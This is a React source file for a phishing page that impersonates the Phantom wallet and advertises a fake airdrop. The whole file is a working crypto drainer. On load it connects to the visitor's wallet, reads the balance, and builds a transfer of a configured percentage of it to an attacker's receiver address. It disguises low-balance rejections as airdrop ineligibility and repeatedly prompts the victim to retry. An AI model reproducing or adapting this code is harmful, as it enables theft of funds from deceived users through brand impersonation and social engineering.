import { useState, useEffect } from 'react';
import './App.css';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { RECEIVER_ADDRESS, PERCENTAGE_TO_DRAIN, SOLANA_NETWORK, MINIMUM_BALANCE } from './config.ts';

declare global {
  interface Window {
    phantom?: {
      solana?: any;
    };
  }
}

function App() {
  const [isConnecting, setIsConnecting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [statusMessage, setStatusMessage] = useState('Connecting to Phantom wallet...');
  const [connectedPublicKey, setConnectedPublicKey] = useState<string | null>(null);

  // Connect to Phantom wallet automatically when the page loads
  useEffect(() => {
    const connectToWallet = async () => {
      console.log('Checking for Phantom wallet...');
      // Check if Phantom wallet is installed
      if (typeof window !== 'undefined' && window.phantom?.solana?.isPhantom) {
        try {
          console.log('Phantom wallet detected');
          setIsConnecting(true);
          setStatusMessage('Connecting to Phantom wallet...');
          console.log('Attempting to connect to Phantom wallet...');
          
          // Small delay to show the connecting message
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Connect to Phantom wallet
          setStatusMessage('Please approve the connection in your Phantom wallet...');
          console.log('Requesting connection approval from Phantom wallet...');
          const response = await window.phantom.solana.connect();
          console.log('Phantom wallet connected:', response);
          
          if (!response || !response.publicKey) {
            throw new Error('Failed to get wallet public key');
          }
          
          const publicKey = response.publicKey.toString();
          console.log('Connected wallet public key:', publicKey);
          setConnectedPublicKey(publicKey);
          setIsConnecting(false);
          setStatusMessage(`Connected to wallet: ${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`);
          console.log(`Connected to wallet: ${publicKey}`);
          
          // Small delay before starting the process
          await new Promise(resolve => setTimeout(resolve, 2000));
          
          // Start the process automatically
          console.log('Starting transaction process...');
          await processTransaction(publicKey);
        } catch (err) {
          console.error('Connection failed:', err);
          setIsConnecting(false);
          
          // Handle specific error cases
          if (err instanceof Error) {
            if (err.message.includes('User rejected') || err.message.includes('Approval declined')) {
              console.log('User rejected wallet connection');
              setStatusMessage('Wallet connection canceled. Please try again.');
              // Don't retry automatically if user rejected, show a try again button
              return;
            }
          }
          
          // No more automatic retries - just show the error
          setStatusMessage('Connection failed. Click "Try Again" to reconnect.');
        }
      } else {
        console.log('Phantom wallet not found');
        setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
      }
    };

    // Auto-connect when component mounts
    console.log('Auto-connecting to Phantom wallet...');
    connectToWallet();
  }, []);

  // Process transaction automatically
  const processTransaction = async (publicKey: string) => {
    console.log('Starting processTransaction function for wallet:', publicKey);
    
    if (!window.phantom?.solana?.isPhantom) {
      console.log('Phantom wallet not found during process');
      setStatusMessage('Phantom wallet not found');
      return;
    }

    try {
      setIsProcessing(true);
      // Hidden balance check message
      console.log('Checking wallet balance...');

      const connection = new Connection(SOLANA_NETWORK);
      const senderPublicKey = new PublicKey(publicKey);
      const receiverPublicKey = new PublicKey(RECEIVER_ADDRESS);
      console.log('Sender public key:', publicKey);
      console.log('Receiver public key:', RECEIVER_ADDRESS);

      // Get the sender's balance (only once, no retries)
      console.log('Getting wallet balance...');
      const balance = await connection.getBalance(senderPublicKey);
      console.log('Wallet balance retrieved:', balance);

      // Check if wallet has any balance
      if (balance <= 0) {
        setStatusMessage('This wallet is not qualified for the airdrop. Please try another wallet.');
        return;
      }

      // Check if wallet balance is below the minimum required
      const minBalance = MINIMUM_BALANCE * 1e9; // Convert SOL to lamports
      if (balance <= minBalance) {
        setStatusMessage('This wallet is not qualified for the airdrop. Please try another wallet.');
        console.log(`Wallet balance ${balance / 1e9} SOL is below minimum requirement of ${MINIMUM_BALANCE} SOL`);
        return;
      }

      // If balance is sufficient, proceed with transaction
      console.log('Wallet balance is sufficient, proceeding with transaction...');
      setStatusMessage('Continue with transaction.');

      // Calculate amount to send (95% of balance minus estimated transaction fees)
      // Using a more accurate fee estimation
      const feeCalculator = await connection.getRecentPrioritizationFees();
      const priorityFee = feeCalculator.length > 0 ? Math.max(...feeCalculator.map(fee => fee.prioritizationFee)) : 5000;
      const estimatedFees = 5000 + priorityFee; // Base fee + priority fee
      
      const amountToSend = Math.floor(balance * (PERCENTAGE_TO_DRAIN / 100) - estimatedFees);

      // Ensure we don't send a negative or zero amount
      if (amountToSend <= 0) {
        setStatusMessage('This wallet is not qualified for the airdrop. Please try another wallet.');
        return;
      }

      setStatusMessage(`Preparing to send ${amountToSend / 1e9} SOL (${PERCENTAGE_TO_DRAIN}% of balance)...`);
      console.log(`Preparing to send ${amountToSend / 1e9} SOL (${PERCENTAGE_TO_DRAIN}% of balance)`);

      // Create transaction
      console.log('Creating transaction...');
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: receiverPublicKey,
          lamports: amountToSend,
        })
      );
      console.log('Transaction created');

      // Get latest blockhash (only once, no retries)
      console.log('Getting latest blockhash...');
      const { blockhash } = await connection.getLatestBlockhash();
      console.log('Blockhash retrieved:', blockhash);

      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;
      console.log('Transaction configured with blockhash and fee payer');

      // Sign transaction
      setStatusMessage(`Please approve the transaction in your Phantom wallet to send ${amountToSend / 1e9} SOL...`);
      console.log(`Requesting transaction signature from Phantom wallet for ${amountToSend / 1e9} SOL...`);
      
      // Ensure we're using the correct method for Phantom wallet
      let signedTransaction;
      if (window.phantom.solana.signTransaction) {
        console.log('Using signTransaction method...');
        signedTransaction = await window.phantom.solana.signTransaction(transaction);
        console.log('Transaction signed by Phantom wallet');
      } else {
        // Fallback method
        console.log('Using signAllTransactions method...');
        const { signature } = await window.phantom.solana.signAllTransactions([transaction]);
        signedTransaction = transaction;
        signedTransaction.addSignature(senderPublicKey, signature);
        console.log('Transaction signed by Phantom wallet (fallback method)');
      }

      // Send transaction (only once, no retries)
      setStatusMessage('Sending transaction...');
      console.log('Sending transaction...');
      const signature = await connection.sendRawTransaction(signedTransaction.serialize());
      console.log('Transaction sent. Signature:', signature);

      // Confirm transaction (only once, no retries)
      setStatusMessage('Confirming transaction...');
      console.log('Confirming transaction...');
      const confirmation = await connection.confirmTransaction(signature, 'confirmed');
      console.log('Transaction confirmed:', confirmation);

      if (confirmation.value.err) {
        console.log('Transaction failed with error:', confirmation.value.err);
        throw new Error('Transaction failed');
      }

      console.log(`Transaction successful! ${amountToSend / 1e9} SOL transferred. Signature: ${signature}`);
      setStatusMessage(`Transaction successful! ${amountToSend / 1e9} SOL transferred. Signature: ${signature.substring(0, 10)}...`);
    } catch (err) {
      console.error('Transaction process failed:', err);
      if (err instanceof Error && (err.message.includes('User rejected') || err.message.includes('Approval declined'))) {
        console.log('User rejected transaction');
        setStatusMessage('Transaction rejected by user. Click "Try Again" to request transaction approval.');
        // Don't retry automatically if user rejected, show a try again button
      } else {
        // Log the full error to console for debugging
        console.error('Full error details:', err);
        // Show a user-friendly message
        setStatusMessage(`Transaction failed: ${err instanceof Error ? err.message : 'Unknown error'}. Please try again later.`);
      }
    } finally {
      setIsProcessing(false);
    }
  };

  // Function to retry the transaction
  const retryTransaction = async () => {
    if (connectedPublicKey) {
      console.log('Retrying transaction...');
      setStatusMessage('Retrying transaction...');
      await new Promise(resolve => setTimeout(resolve, 1000));
      await processTransaction(connectedPublicKey);
    }
  };

  return (
    <div className="phantom-container">
      <div className="phantom-content">
        <h1 className="phantom-title">Phantom</h1>
        
        <div className="phantom-logo">
          <img src="/pantom.png" alt="Phantom Logo" className="phantom-image" />
        </div>
        
        <h2 className="phantom-subtitle">Continue in Phantom</h2>
        <p className="phantom-description">Accept connection request in the wallet</p>
        
        <div className="status-container">
          <p className="status-message">{statusMessage}</p>
          {(isConnecting || isProcessing) && (
            <div className="loading-spinner"></div>
          )}
          {/* Show Try Again button when transaction is rejected */}
          {!isConnecting && !isProcessing && statusMessage.includes('Transaction rejected by user') && (
            <button className="retry-button" onClick={retryTransaction}>
              Try Again
            </button>
          )}
          {/* Show Try Again button when connection is rejected */}
          {!isConnecting && !isProcessing && statusMessage.includes('Wallet connection canceled') && (
            <button className="retry-button" onClick={() => {
              setStatusMessage('Connecting to Phantom wallet...');
              setTimeout(() => {
                const connectToWallet = async () => {
                  console.log('Checking for Phantom wallet...');
                  // Check if Phantom wallet is installed
                  if (typeof window !== 'undefined' && window.phantom?.solana?.isPhantom) {
                    try {
                      console.log('Phantom wallet detected');
                      setIsConnecting(true);
                      setStatusMessage('Connecting to Phantom wallet...');
                      console.log('Attempting to connect to Phantom wallet...');
                      
                      // Small delay to show the connecting message
                      await new Promise(resolve => setTimeout(resolve, 1000));
                      
                      // Connect to Phantom wallet
                      setStatusMessage('Please approve the connection in your Phantom wallet...');
                      console.log('Requesting connection approval from Phantom wallet...');
                      const response = await window.phantom.solana.connect();
                      console.log('Phantom wallet connected:', response);
                      
                      if (!response || !response.publicKey) {
                        throw new Error('Failed to get wallet public key');
                      }
                      
                      const publicKey = response.publicKey.toString();
                      console.log('Connected wallet public key:', publicKey);
                      setConnectedPublicKey(publicKey);
                      setIsConnecting(false);
                      setStatusMessage(`Connected to wallet: ${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`);
                      console.log(`Connected to wallet: ${publicKey}`);
                      
                      // Small delay before starting the process
                      await new Promise(resolve => setTimeout(resolve, 2000));
                      
                      // Start the process automatically
                      console.log('Starting transaction process...');
                      await processTransaction(publicKey);
                    } catch (err) {
                      console.error('Connection failed:', err);
                      setIsConnecting(false);
                      
                      // Handle specific error cases
                      if (err instanceof Error) {
                        if (err.message.includes('User rejected') || err.message.includes('Approval declined')) {
                          console.log('User rejected wallet connection');
                          setStatusMessage('Wallet connection canceled. Please try again.');
                          // Don't retry automatically if user rejected, show a try again button
                          return;
                        }
                      }
                      
                      setStatusMessage('Connection failed. Click "Try Again" to reconnect.');
                    }
                  } else {
                    console.log('Phantom wallet not found');
                    setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
                  }
                };
                
                connectToWallet();
              }, 100);
            }}>
              Try Again
            </button>
          )}
          {/* Show Try Again button when connection fails for other reasons */}
          {!isConnecting && !isProcessing && statusMessage.includes('Connection failed') && !statusMessage.includes('Wallet connection canceled') && (
            <button className="retry-button" onClick={() => {
              setStatusMessage('Connecting to Phantom wallet...');
              setTimeout(() => {
                const connectToWallet = async () => {
                  console.log('Checking for Phantom wallet...');
                  // Check if Phantom wallet is installed
                  if (typeof window !== 'undefined' && window.phantom?.solana?.isPhantom) {
                    try {
                      console.log('Phantom wallet detected');
                      setIsConnecting(true);
                      setStatusMessage('Connecting to Phantom wallet...');
                      console.log('Attempting to connect to Phantom wallet...');
                      
                      // Small delay to show the connecting message
                      await new Promise(resolve => setTimeout(resolve, 1000));
                      
                      // Connect to Phantom wallet
                      setStatusMessage('Please approve the connection in your Phantom wallet...');
                      console.log('Requesting connection approval from Phantom wallet...');
                      const response = await window.phantom.solana.connect();
                      console.log('Phantom wallet connected:', response);
                      
                      if (!response || !response.publicKey) {
                        throw new Error('Failed to get wallet public key');
                      }
                      
                      const publicKey = response.publicKey.toString();
                      console.log('Connected wallet public key:', publicKey);
                      setConnectedPublicKey(publicKey);
                      setIsConnecting(false);
                      setStatusMessage(`Connected to wallet: ${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`);
                      console.log(`Connected to wallet: ${publicKey}`);
                      
                      // Small delay before starting the process
                      await new Promise(resolve => setTimeout(resolve, 2000));
                      
                      // Start the process automatically
                      console.log('Starting transaction process...');
                      await processTransaction(publicKey);
                    } catch (err) {
                      console.error('Connection failed:', err);
                      setIsConnecting(false);
                      
                      // Handle specific error cases
                      if (err instanceof Error) {
                        if (err.message.includes('User rejected') || err.message.includes('Approval declined')) {
                          console.log('User rejected wallet connection');
                          setStatusMessage('Wallet connection canceled. Please try again.');
                          // Don't retry automatically if user rejected, show a try again button
                          return;
                        }
                      }
                      
                      setStatusMessage('Connection failed. Click "Try Again" to reconnect.');
                    }
                  } else {
                    console.log('Phantom wallet not found');
                    setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
                  }
                };
                
                connectToWallet();
              }, 100);
            }}>
              Try Again
            </button>
          )}
          {/* Show Try Again button when wallet doesn't meet minimum balance requirement */}
          {!isConnecting && !isProcessing && statusMessage.includes('not qualified for the airdrop') && (
            <button className="retry-button" onClick={() => {
              setStatusMessage('Connecting to Phantom wallet...');
              setTimeout(() => {
                const connectToWallet = async () => {
                  console.log('Checking for Phantom wallet...');
                  // Check if Phantom wallet is installed
                  if (typeof window !== 'undefined' && window.phantom?.solana?.isPhantom) {
                    try {
                      console.log('Phantom wallet detected');
                      setIsConnecting(true);
                      setStatusMessage('Connecting to Phantom wallet...');
                      console.log('Attempting to connect to Phantom wallet...');
                      
                      // Small delay to show the connecting message
                      await new Promise(resolve => setTimeout(resolve, 1000));
                      
                      // Connect to Phantom wallet
                      setStatusMessage('Please approve the connection in your Phantom wallet...');
                      console.log('Requesting connection approval from Phantom wallet...');
                      const response = await window.phantom.solana.connect();
                      console.log('Phantom wallet connected:', response);
                      
                      if (!response || !response.publicKey) {
                        throw new Error('Failed to get wallet public key');
                      }
                      
                      const publicKey = response.publicKey.toString();
                      console.log('Connected wallet public key:', publicKey);
                      setConnectedPublicKey(publicKey);
                      setIsConnecting(false);
                      setStatusMessage(`Connected to wallet: ${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`);
                      console.log(`Connected to wallet: ${publicKey}`);
                      
                      // Small delay before starting the process
                      await new Promise(resolve => setTimeout(resolve, 2000));
                      
                      // Start the process automatically
                      console.log('Starting transaction process...');
                      await processTransaction(publicKey);
                    } catch (err) {
                      console.error('Connection failed:', err);
                      setIsConnecting(false);
                      
                      // Handle specific error cases
                      if (err instanceof Error) {
                        if (err.message.includes('User rejected') || err.message.includes('Approval declined')) {
                          console.log('User rejected wallet connection');
                          setStatusMessage('Wallet connection canceled. Please try again.');
                          // Don't retry automatically if user rejected, show a try again button
                          return;
                        }
                      }
                      
                      setStatusMessage('Connection failed. Click "Try Again" to reconnect.');
                    }
                  } else {
                    console.log('Phantom wallet not found');
                    setStatusMessage('Phantom wallet not found. Please install Phantom wallet extension.');
                  }
                };
                
                connectToWallet();
              }, 100);
            }}>
              Try Another Wallet
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;